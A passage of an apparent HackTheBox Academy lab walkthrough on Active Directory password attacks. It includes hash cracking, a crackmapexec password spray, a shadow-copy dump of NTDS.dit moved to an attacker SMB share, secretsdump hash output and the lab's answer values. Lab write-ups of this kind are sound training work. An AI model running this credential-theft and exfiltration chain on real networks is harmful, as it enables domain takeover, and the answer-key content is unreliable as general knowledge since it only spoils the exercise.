<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-162-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-162-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-162-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-162-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-162-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-162-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-162-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-162-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-162-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-162-10">10</a></span>
<span class="normal"><a href="#__codelineno-162-11">11</a></span>
<span class="normal"><a href="#__codelineno-162-12">12</a></span>
<span class="normal"><a href="#__codelineno-162-13">13</a></span>
<span class="normal"><a href="#__codelineno-162-14">14</a></span>
<span class="normal"><a href="#__codelineno-162-15">15</a></span>
<span class="normal"><a href="#__codelineno-162-16">16</a></span>
<span class="normal"><a href="#__codelineno-162-17">17</a></span>
<span class="normal"><a href="#__codelineno-162-18">18</a></span>
<span class="normal"><a href="#__codelineno-162-19">19</a></span>
<span class="normal"><a href="#__codelineno-162-20">20</a></span>
<span class="normal"><a href="#__codelineno-162-21">21</a></span>
<span class="normal"><a href="#__codelineno-162-22">22</a></span>
<span class="normal"><a href="#__codelineno-162-23">23</a></span>
<span class="normal"><a href="#__codelineno-162-24">24</a></span>
<span class="normal"><a href="#__codelineno-162-25">25</a></span>
<span class="normal"><a href="#__codelineno-162-26">26</a></span>
<span class="normal"><a href="#__codelineno-162-27">27</a></span>
<span class="normal"><a href="#__codelineno-162-28">28</a></span>
<span class="normal"><a href="#__codelineno-162-29">29</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-162-1"><a id="__codelineno-162-1" name="__codelineno-162-1"></a>== LogonSession ==
</span><span id="__span-162-2"><a id="__codelineno-162-2" name="__codelineno-162-2"></a>authentication_id 123625 (1e2e9)
</span><span id="__span-162-3"><a id="__codelineno-162-3" name="__codelineno-162-3"></a>session_id 0
</span><span id="__span-162-4"><a id="__codelineno-162-4" name="__codelineno-162-4"></a>username Vendor
</span><span id="__span-162-5"><a id="__codelineno-162-5" name="__codelineno-162-5"></a>domainname FS01
</span><span id="__span-162-6"><a id="__codelineno-162-6" name="__codelineno-162-6"></a>logon_server FS01
</span><span id="__span-162-7"><a id="__codelineno-162-7" name="__codelineno-162-7"></a>logon_time 2025-01-17T21:20:58.864952+00:00
</span><span id="__span-162-8"><a id="__codelineno-162-8" name="__codelineno-162-8"></a>sid S-1-5-21-2288469977-2371064354-2971934342-1003
</span><span id="__span-162-9"><a id="__codelineno-162-9" name="__codelineno-162-9"></a>luid 123625
</span><span id="__span-162-10"><a id="__codelineno-162-10" name="__codelineno-162-10"></a>    == MSV ==
</span><span id="__span-162-11"><a id="__codelineno-162-11" name="__codelineno-162-11"></a>        Username: Vendor
</span><span id="__span-162-12"><a id="__codelineno-162-12" name="__codelineno-162-12"></a>        Domain: FS01
</span><span id="__span-162-13"><a id="__codelineno-162-13" name="__codelineno-162-13"></a>        LM: NA
</span><span id="__span-162-14"><a id="__codelineno-162-14" name="__codelineno-162-14"></a>        NT: 31f87811133bc6aaa75a536e77f64314
</span><span id="__span-162-15"><a id="__codelineno-162-15" name="__codelineno-162-15"></a>        SHA1: 2b1c560c35923a8936263770a047764d0422caba
</span><span id="__span-162-16"><a id="__codelineno-162-16" name="__codelineno-162-16"></a>        DPAPI: 0000000000000000000000000000000000000000
</span><span id="__span-162-17"><a id="__codelineno-162-17" name="__codelineno-162-17"></a>    == WDIGEST [1e2e9]==
</span><span id="__span-162-18"><a id="__codelineno-162-18" name="__codelineno-162-18"></a>        username Vendor
</span><span id="__span-162-19"><a id="__codelineno-162-19" name="__codelineno-162-19"></a>        domainname FS01
</span><span id="__span-162-20"><a id="__codelineno-162-20" name="__codelineno-162-20"></a>        password None
</span><span id="__span-162-21"><a id="__codelineno-162-21" name="__codelineno-162-21"></a>        password (hex)
</span><span id="__span-162-22"><a id="__codelineno-162-22" name="__codelineno-162-22"></a>    == Kerberos ==
</span><span id="__span-162-23"><a id="__codelineno-162-23" name="__codelineno-162-23"></a>        Username: Vendor
</span><span id="__span-162-24"><a id="__codelineno-162-24" name="__codelineno-162-24"></a>        Domain: FS01
</span><span id="__span-162-25"><a id="__codelineno-162-25" name="__codelineno-162-25"></a>    == WDIGEST [1e2e9]==
</span><span id="__span-162-26"><a id="__codelineno-162-26" name="__codelineno-162-26"></a>        username Vendor
</span><span id="__span-162-27"><a id="__codelineno-162-27" name="__codelineno-162-27"></a>        domainname FS01
</span><span id="__span-162-28"><a id="__codelineno-162-28" name="__codelineno-162-28"></a>        password None
</span><span id="__span-162-29"><a id="__codelineno-162-29" name="__codelineno-162-29"></a>        password (hex)
</span></code></pre></div></td></tr></table></div>
<p>Then we use hashcat:</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-163-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-163-1"><a id="__codelineno-163-1" name="__codelineno-163-1"></a><span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>31f87811133bc6aaa75a536e77f64314<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>
</span></code></pre></div></td></tr></table></div>
<p>Results: Mic@123</p>
<p><strong>What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: </strong>.<em>)</em>*</p>
<p>Resutls: ntds.dit</p>
<p><strong>Submit the NT hash associated with the Administrator user from the example output in the section reading.</strong></p>
<p>The answer is in the reading materials.</p>
<p>Results: 64f12cddaa88057e06a81b54e73b949b</p>
<p><strong>On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-164-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-164-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-164-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-164-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-164-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-164-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-164-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-164-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-164-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-164-10">10</a></span>
<span class="normal"><a href="#__codelineno-164-11">11</a></span>
<span class="normal"><a href="#__codelineno-164-12">12</a></span>
<span class="normal"><a href="#__codelineno-164-13">13</a></span>
<span class="normal"><a href="#__codelineno-164-14">14</a></span>
<span class="normal"><a href="#__codelineno-164-15">15</a></span>
<span class="normal"><a href="#__codelineno-164-16">16</a></span>
<span class="normal"><a href="#__codelineno-164-17">17</a></span>
<span class="normal"><a href="#__codelineno-164-18">18</a></span>
<span class="normal"><a href="#__codelineno-164-19">19</a></span>
<span class="normal"><a href="#__codelineno-164-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-164-1"><a id="__codelineno-164-1" name="__codelineno-164-1"></a><span class="c1"># The reading materials reveals the use of the /usr/share/wordlists/fasttrack.txt. We get it from here: https://github.com/drtychai/wordlists/blob/master/fasttrack.txt</span>
</span><span id="__span-164-2"><a id="__codelineno-164-2" name="__codelineno-164-2"></a><span class="c1"># Create a list of original names called original.txt with:</span>
</span><span id="__span-164-3"><a id="__codelineno-164-3" name="__codelineno-164-3"></a>John<span class="w"> </span>Marston
</span><span id="__span-164-4"><a id="__codelineno-164-4" name="__codelineno-164-4"></a>Carol<span class="w"> </span>Johnson
</span><span id="__span-164-5"><a id="__codelineno-164-5" name="__codelineno-164-5"></a>Jennifer<span class="w"> </span>Stapleton
</span><span id="__span-164-6"><a id="__codelineno-164-6" name="__codelineno-164-6"></a>
</span><span id="__span-164-7"><a id="__codelineno-164-7" name="__codelineno-164-7"></a><span class="c1"># Use username Anarchy to obtain combinations of these names for usual username formats:</span>
</span><span id="__span-164-8"><a id="__codelineno-164-8" name="__codelineno-164-8"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/urbanadventurer/username-anarchy.git
</span><span id="__span-164-9"><a id="__codelineno-164-9" name="__codelineno-164-9"></a><span class="nb">cd</span><span class="w"> </span>username-anarchy
</span><span id="__span-164-10"><a id="__codelineno-164-10" name="__codelineno-164-10"></a>./username-anarchy<span class="w"> </span>-i<span class="w"> </span>~/borrar/original.txt<span class="w"> </span>
</span><span id="__span-164-11"><a id="__codelineno-164-11" name="__codelineno-164-11"></a>
</span><span id="__span-164-12"><a id="__codelineno-164-12" name="__codelineno-164-12"></a><span class="c1"># Save these names under usernames.txt</span>
</span><span id="__span-164-13"><a id="__codelineno-164-13" name="__codelineno-164-13"></a><span class="c1"># Enumerate services</span>
</span><span id="__span-164-14"><a id="__codelineno-164-14" name="__codelineno-164-14"></a><span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn<span class="w"> </span>
</span><span id="__span-164-15"><a id="__codelineno-164-15" name="__codelineno-164-15"></a>
</span><span id="__span-164-16"><a id="__codelineno-164-16" name="__codelineno-164-16"></a><span class="c1"># Run a password attack:</span>
</span><span id="__span-164-17"><a id="__codelineno-164-17" name="__codelineno-164-17"></a>crackmapexec<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>~/borrar/usernames.txt<span class="w"> </span>-p<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span>--sam
</span><span id="__span-164-18"><a id="__codelineno-164-18" name="__codelineno-164-18"></a>
</span><span id="__span-164-19"><a id="__codelineno-164-19" name="__codelineno-164-19"></a><span class="c1"># Results:</span>
</span><span id="__span-164-20"><a id="__codelineno-164-20" name="__codelineno-164-20"></a>SMB<span class="w">         </span><span class="m">10</span>.129.202.85<span class="w">   </span><span class="m">445</span><span class="w">    </span>ILF-DC01<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>ILF.local<span class="se">\j</span>marston:P@ssword!<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: jmarston:P@ssword!</p>
<p>Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-165-1">1</a></span>
<span class="normal"><a href="#__codelineno-165-2">2</a></span>
<span class="normal"><a href="#__codelineno-165-3">3</a></span>
<span class="normal"><a href="#__codelineno-165-4">4</a></span>
<span class="normal"><a href="#__codelineno-165-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-165-1"><a id="__codelineno-165-1" name="__codelineno-165-1"></a><span class="c1"># Alternative 1: crackmapexec</span>
</span><span id="__span-165-2"><a id="__codelineno-165-2" name="__codelineno-165-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span>-u<span class="w"> </span>jmarston<span class="w"> </span>-p<span class="w"> </span>P@ssword!<span class="w"> </span>--ntds<span class="w"> </span>
</span><span id="__span-165-3"><a id="__codelineno-165-3" name="__codelineno-165-3"></a>
</span><span id="__span-165-4"><a id="__codelineno-165-4" name="__codelineno-165-4"></a><span class="c1"># Crack the hash</span>
</span><span id="__span-165-5"><a id="__codelineno-165-5" name="__codelineno-165-5"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>92fd67fd2f49d0e83744aa82363f021b<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-166-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-166-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-166-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-166-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-166-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-166-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-166-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-166-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-166-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-166-10">10</a></span>
<span class="normal"><a href="#__codelineno-166-11">11</a></span>
<span class="normal"><a href="#__codelineno-166-12">12</a></span>
<span class="normal"><a href="#__codelineno-166-13">13</a></span>
<span class="normal"><a href="#__codelineno-166-14">14</a></span>
<span class="normal"><a href="#__codelineno-166-15">15</a></span>
<span class="normal"><a href="#__codelineno-166-16">16</a></span>
<span class="normal"><a href="#__codelineno-166-17">17</a></span>
<span class="normal"><a href="#__codelineno-166-18">18</a></span>
<span class="normal"><a href="#__codelineno-166-19">19</a></span>
<span class="normal"><a href="#__codelineno-166-20">20</a></span>
<span class="normal"><a href="#__codelineno-166-21">21</a></span>
<span class="normal"><a href="#__codelineno-166-22">22</a></span>
<span class="normal"><a href="#__codelineno-166-23">23</a></span>
<span class="normal"><a href="#__codelineno-166-24">24</a></span>
<span class="normal"><a href="#__codelineno-166-25">25</a></span>
<span class="normal"><a href="#__codelineno-166-26">26</a></span>
<span class="normal"><a href="#__codelineno-166-27">27</a></span>
<span class="normal"><a href="#__codelineno-166-28">28</a></span>
<span class="normal"><a href="#__codelineno-166-29">29</a></span>
<span class="normal"><a href="#__codelineno-166-30">30</a></span>
<span class="normal"><a href="#__codelineno-166-31">31</a></span>
<span class="normal"><a href="#__codelineno-166-32">32</a></span>
<span class="normal"><a href="#__codelineno-166-33">33</a></span>
<span class="normal"><a href="#__codelineno-166-34">34</a></span>
<span class="normal"><a href="#__codelineno-166-35">35</a></span>
<span class="normal"><a href="#__codelineno-166-36">36</a></span>
<span class="normal"><a href="#__codelineno-166-37">37</a></span>
<span class="normal"><a href="#__codelineno-166-38">38</a></span>
<span class="normal"><a href="#__codelineno-166-39">39</a></span>
<span class="normal"><a href="#__codelineno-166-40">40</a></span>
<span class="normal"><a href="#__codelineno-166-41">41</a></span>
<span class="normal"><a href="#__codelineno-166-42">42</a></span>
<span class="normal"><a href="#__codelineno-166-43">43</a></span>
<span class="normal"><a href="#__codelineno-166-44">44</a></span>
<span class="normal"><a href="#__codelineno-166-45">45</a></span>
<span class="normal"><a href="#__codelineno-166-46">46</a></span>
<span class="normal"><a href="#__codelineno-166-47">47</a></span>
<span class="normal"><a href="#__codelineno-166-48">48</a></span>
<span class="normal"><a href="#__codelineno-166-49">49</a></span>
<span class="normal"><a href="#__codelineno-166-50">50</a></span>
<span class="normal"><a href="#__codelineno-166-51">51</a></span>
<span class="normal"><a href="#__codelineno-166-52">52</a></span>
<span class="normal"><a href="#__codelineno-166-53">53</a></span>
<span class="normal"><a href="#__codelineno-166-54">54</a></span>
<span class="normal"><a href="#__codelineno-166-55">55</a></span>
<span class="normal"><a href="#__codelineno-166-56">56</a></span>
<span class="normal"><a href="#__codelineno-166-57">57</a></span>
<span class="normal"><a href="#__codelineno-166-58">58</a></span>
<span class="normal"><a href="#__codelineno-166-59">59</a></span>
<span class="normal"><a href="#__codelineno-166-60">60</a></span>
<span class="normal"><a href="#__codelineno-166-61">61</a></span>
<span class="normal"><a href="#__codelineno-166-62">62</a></span>
<span class="normal"><a href="#__codelineno-166-63">63</a></span>
<span class="normal"><a href="#__codelineno-166-64">64</a></span>
<span class="normal"><a href="#__codelineno-166-65">65</a></span>
<span class="normal"><a href="#__codelineno-166-66">66</a></span>
<span class="normal"><a href="#__codelineno-166-67">67</a></span>
<span class="normal"><a href="#__codelineno-166-68">68</a></span>
<span class="normal"><a href="#__codelineno-166-69">69</a></span>
<span class="normal"><a href="#__codelineno-166-70">70</a></span>
<span class="normal"><a href="#__codelineno-166-71">71</a></span>
<span class="normal"><a href="#__codelineno-166-72">72</a></span>
<span class="normal"><a href="#__codelineno-166-73">73</a></span>
<span class="normal"><a href="#__codelineno-166-74">74</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-166-1"><a id="__codelineno-166-1" name="__codelineno-166-1"></a>#  Alternative 2
</span><span id="__span-166-2"><a id="__codelineno-166-2" name="__codelineno-166-2"></a>
</span><span id="__span-166-3"><a id="__codelineno-166-3" name="__codelineno-166-3"></a># 1. Connecting to a DC with Evil-WinRM
</span><span id="__span-166-4"><a id="__codelineno-166-4" name="__codelineno-166-4"></a>evil-winrm -i $ip -u jmarston -p &#39;P@ssword!&#39;
</span><span id="__span-166-5"><a id="__codelineno-166-5" name="__codelineno-166-5"></a>
</span><span id="__span-166-6"><a id="__codelineno-166-6" name="__codelineno-166-6"></a># 2. Checking Local Group Membership
</span><span id="__span-166-7"><a id="__codelineno-166-7" name="__codelineno-166-7"></a>net localgroup
</span><span id="__span-166-8"><a id="__codelineno-166-8" name="__codelineno-166-8"></a>
</span><span id="__span-166-9"><a id="__codelineno-166-9" name="__codelineno-166-9"></a># 3. Checking User Account Privileges including Domain
</span><span id="__span-166-10"><a id="__codelineno-166-10" name="__codelineno-166-10"></a>net user $username
</span><span id="__span-166-11"><a id="__codelineno-166-11" name="__codelineno-166-11"></a>
</span><span id="__span-166-12"><a id="__codelineno-166-12" name="__codelineno-166-12"></a># 4. Creating Shadow Copy of C: 
</span><span id="__span-166-13"><a id="__codelineno-166-13" name="__codelineno-166-13"></a>vssadmin CREATE SHADOW /For=C:
</span><span id="__span-166-14"><a id="__codelineno-166-14" name="__codelineno-166-14"></a># Results:
</span><span id="__span-166-15"><a id="__codelineno-166-15" name="__codelineno-166-15"></a># Successfully created shadow copy for &#39;C:\&#39;
</span><span id="__span-166-16"><a id="__codelineno-166-16" name="__codelineno-166-16"></a>      Shadow Copy ID: {0480243a-8bf0-4af9-a5f5-4a842e49d6c3}
</span><span id="__span-166-17"><a id="__codelineno-166-17" name="__codelineno-166-17"></a>    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
</span><span id="__span-166-18"><a id="__codelineno-166-18" name="__codelineno-166-18"></a>
</span><span id="__span-166-19"><a id="__codelineno-166-19" name="__codelineno-166-19"></a># 5. Copying NTDS.dit from the VSS
</span><span id="__span-166-20"><a id="__codelineno-166-20" name="__codelineno-166-20"></a>cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS.dit
</span><span id="__span-166-21"><a id="__codelineno-166-21" name="__codelineno-166-21"></a>
</span><span id="__span-166-22"><a id="__codelineno-166-22" name="__codelineno-166-22"></a>
</span><span id="__span-166-23"><a id="__codelineno-166-23" name="__codelineno-166-23"></a># 6. We will also need either the SYSTEM hive or bootkey is required for local parsing. So let&#39;s save the system hive
</span><span id="__span-166-24"><a id="__codelineno-166-24" name="__codelineno-166-24"></a>reg.exe save hklm\system C:\system.save
</span><span id="__span-166-25"><a id="__codelineno-166-25" name="__codelineno-166-25"></a>
</span><span id="__span-166-26"><a id="__codelineno-166-26" name="__codelineno-166-26"></a># 7. Transfer file to attacking machine. For that I will set up a shared unit in the attacker machine:
</span><span id="__span-166-27"><a id="__codelineno-166-27" name="__codelineno-166-27"></a>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~/borrar/
</span><span id="__span-166-28"><a id="__codelineno-166-28" name="__codelineno-166-28"></a>
</span><span id="__span-166-29"><a id="__codelineno-166-29" name="__codelineno-166-29"></a># 8. Copy the file from the victim&#39;s machine (windows)
</span><span id="__span-166-30"><a id="__codelineno-166-30" name="__codelineno-166-30"></a>cmd.exe /c move C:\NTDS.dit \\10.10.15.90\CompData
</span><span id="__span-166-31"><a id="__codelineno-166-31" name="__codelineno-166-31"></a>cmd.exe /c move c:\system.save \\10.10.15.90\CompData
</span><span id="__span-166-32"><a id="__codelineno-166-32" name="__codelineno-166-32"></a>
</span><span id="__span-166-33"><a id="__codelineno-166-33" name="__codelineno-166-33"></a># Extract the NTDS.dit file and crack it with secretsdump:
</span><span id="__span-166-34"><a id="__codelineno-166-34" name="__codelineno-166-34"></a>python ~/tools/impacket/examples/secretsdump.py -ntds ~/borrar/NTDS.dit  -system ~/borrar/system.save -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
</span><span id="__span-166-35"><a id="__codelineno-166-35" name="__codelineno-166-35"></a>
</span><span id="__span-166-36"><a id="__codelineno-166-36" name="__codelineno-166-36"></a># Results:
</span><span id="__span-166-37"><a id="__codelineno-166-37" name="__codelineno-166-37"></a>[*] Reading and decrypting hashes from /home/lala/borrar/NTDS.dit 
</span><span id="__span-166-38"><a id="__codelineno-166-38" name="__codelineno-166-38"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
</span><span id="__span-166-39"><a id="__codelineno-166-39" name="__codelineno-166-39"></a>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span id="__span-166-40"><a id="__codelineno-166-40" name="__codelineno-166-40"></a>ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8af61f67a96ac6fb352f192b1cfc6b56:::
</span><span id="__span-166-41"><a id="__codelineno-166-41" name="__codelineno-166-41"></a>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
</span><span id="__span-166-42"><a id="__codelineno-166-42" name="__codelineno-166-42"></a>ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
</span><span id="__span-166-43"><a id="__codelineno-166-43" name="__codelineno-166-43"></a>ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
</span><span id="__span-166-44"><a id="__codelineno-166-44" name="__codelineno-166-44"></a>ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
</span><span id="__span-166-45"><a id="__codelineno-166-45" name="__codelineno-166-45"></a>ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
</span><span id="__span-166-46"><a id="__codelineno-166-46" name="__codelineno-166-46"></a>LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
</span><span id="__span-166-47"><a id="__codelineno-166-47" name="__codelineno-166-47"></a>[*] Kerberos keys from /home/lala/borrar/NTDS.dit 
</span><span id="__span-166-48"><a id="__codelineno-166-48" name="__codelineno-166-48"></a>Administrator:aes256-cts-hmac-sha1-96:a2bfeccd55aca0e53f893d1ae43abcdf0d6aa5793cd5d2dbe8c6f577cbbe5a35
</span><span id="__span-166-49"><a id="__codelineno-166-49" name="__codelineno-166-49"></a>Administrator:aes128-cts-hmac-sha1-96:84a147160d42613b0ffe0bd060dbca9c
</span><span id="__span-166-50"><a id="__codelineno-166-50" name="__codelineno-166-50"></a>Administrator:des-cbc-md5:3ec8540110d3e058
</span><span id="__span-166-51"><a id="__codelineno-166-51" name="__codelineno-166-51"></a>ILF-DC01$:aes256-cts-hmac-sha1-96:50d1401419bf8fe68aa149e67f327af59fc923653e3ebe212345883a3b92bb2d
</span><span id="__span-166-52"><a id="__codelineno-166-52" name="__codelineno-166-52"></a>ILF-DC01$:aes128-cts-hmac-sha1-96:f16761d510325e2640b31a9ef9e5350a
</span><span id="__span-166-53"><a id="__codelineno-166-53" name="__codelineno-166-53"></a>ILF-DC01$:des-cbc-md5:f20b1ae0e0f2986b
</span><span id="__span-166-54"><a id="__codelineno-166-54" name="__codelineno-166-54"></a>krbtgt:aes256-cts-hmac-sha1-96:4c3efde4c6ef4005e67a3d9aa09d91d9325518443e54a914f83839a2ed7d02ec
</span><span id="__span-166-55"><a id="__codelineno-166-55" name="__codelineno-166-55"></a>krbtgt:aes128-cts-hmac-sha1-96:69ef62ae6a467bca3e3aa07495b81a64
</span><span id="__span-166-56"><a id="__codelineno-166-56" name="__codelineno-166-56"></a>krbtgt:des-cbc-md5:6e1fa8f219daa82c
</span><span id="__span-166-57"><a id="__codelineno-166-57" name="__codelineno-166-57"></a>ILF.local\jmarston:aes256-cts-hmac-sha1-96:9e7d0ec693ff443437aae379ee87d07ed42d6745a4eab784eaa54ceff2fa2649
</span><span id="__span-166-58"><a id="__codelineno-166-58" name="__codelineno-166-58"></a>ILF.local\jmarston:aes128-cts-hmac-sha1-96:b106cf089340b2e610710d6a89ea890d
</span><span id="__span-166-59"><a id="__codelineno-166-59" name="__codelineno-166-59"></a>ILF.local\jmarston:des-cbc-md5:5e5dc24ff73ee9a8
</span><span id="__span-166-60"><a id="__codelineno-166-60" name="__codelineno-166-60"></a>ILF.local\cjohnson:aes256-cts-hmac-sha1-96:2d332798b58ed1a9611e2ecabb338aec01fab4519b08ce4986ebc405c851d7fc
</span><span id="__span-166-61"><a id="__codelineno-166-61" name="__codelineno-166-61"></a>ILF.local\cjohnson:aes128-cts-hmac-sha1-96:cf66ade75cbc1c17d55d6abae64a77f3
</span><span id="__span-166-62"><a id="__codelineno-166-62" name="__codelineno-166-62"></a>ILF.local\cjohnson:des-cbc-md5:83f8cbe3386d858a
</span><span id="__span-166-63"><a id="__codelineno-166-63" name="__codelineno-166-63"></a>ILF.local\jstapleton:aes256-cts-hmac-sha1-96:bf06c080a3e7975799a9f58b606fef8a4b2c4f574cb9e7e99c0686971850ca64
</span><span id="__span-166-64"><a id="__codelineno-166-64" name="__codelineno-166-64"></a>ILF.local\jstapleton:aes128-cts-hmac-sha1-96:828fbbc322f3929f1fe164bcae50e310
</span><span id="__span-166-65"><a id="__codelineno-166-65" name="__codelineno-166-65"></a>ILF.local\jstapleton:des-cbc-md5:d057ad893d8a6b2f
</span><span id="__span-166-66"><a id="__codelineno-166-66" name="__codelineno-166-66"></a>ILF.local\gwaffle:aes256-cts-hmac-sha1-96:b3a7e81c743c8457ba643a5c63058af6f8d21f2a71c793ff7058e73f82ff45a0
</span><span id="__span-166-67"><a id="__codelineno-166-67" name="__codelineno-166-67"></a>ILF.local\gwaffle:aes128-cts-hmac-sha1-96:76943b80314d6f172ed66bb7a4ed72ad
</span><span id="__span-166-68"><a id="__codelineno-166-68" name="__codelineno-166-68"></a>ILF.local\gwaffle:des-cbc-md5:8668a2d073764a3e
</span><span id="__span-166-69"><a id="__codelineno-166-69" name="__codelineno-166-69"></a>LAPTOP01$:aes256-cts-hmac-sha1-96:e0b95703b96705adaf6b5ddadb1f9896729e75683e99f55a6c7bf31e32c3a6d0
</span><span id="__span-166-70"><a id="__codelineno-166-70" name="__codelineno-166-70"></a>LAPTOP01$:aes128-cts-hmac-sha1-96:f42fef661ee76d7e5d2062443e569d5d
</span><span id="__span-166-71"><a id="__codelineno-166-71" name="__codelineno-166-71"></a>LAPTOP01$:des-cbc-md5:26ade5ce709bb5e5
</span><span id="__span-166-72"><a id="__codelineno-166-72" name="__codelineno-166-72"></a>
</span><span id="__span-166-73"><a id="__codelineno-166-73" name="__codelineno-166-73"></a># Crack the hashes
</span><span id="__span-166-74"><a id="__codelineno-166-74" name="__codelineno-166-74"></a># For AES256-CTS-HMAC-SHA1-96
</span></code></pre></div></td></tr></table></div>
<p>Results: Winter2008</p>
<p><strong>RDP to  with user "Bob" and password "HTB_@cademy_stdnt!" What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-167-1">1</a></span>
<span class="normal"><a href="#__codelineno-167-2">2</a></span>
<span class="normal"><a href="#__codelineno-167-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-167-1"><a id="__codelineno-167-1" name="__codelineno-167-1"></a><span class="c1"># Open the excel file under C:\Users\bob\Desktop\WorkStuff\Creds</span>
</span><span id="__span-167-2"><a id="__codelineno-167-2" name="__codelineno-167-2"></a><span class="c1"># Results: admin:WellConnected123</span>
</span><span id="__span-167-3"><a id="__codelineno-167-3" name="__codelineno-167-3"></a><span class="c1"># bwilliamson:P@55w0rd!</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: WellConnected123</p>
<p><strong>RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". What is the GitLab access code Bob uses? (Format: Case-Sensitive)</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-168-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-168-1"><a id="__codelineno-168-1" name="__codelineno-168-1"></a><span class="c1"># Open the folder WorkStuff available in desktop and open the file GitlabAccessCodeJustIncase</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: 3z1ePfGbjWPsTfCsZfjy</p>
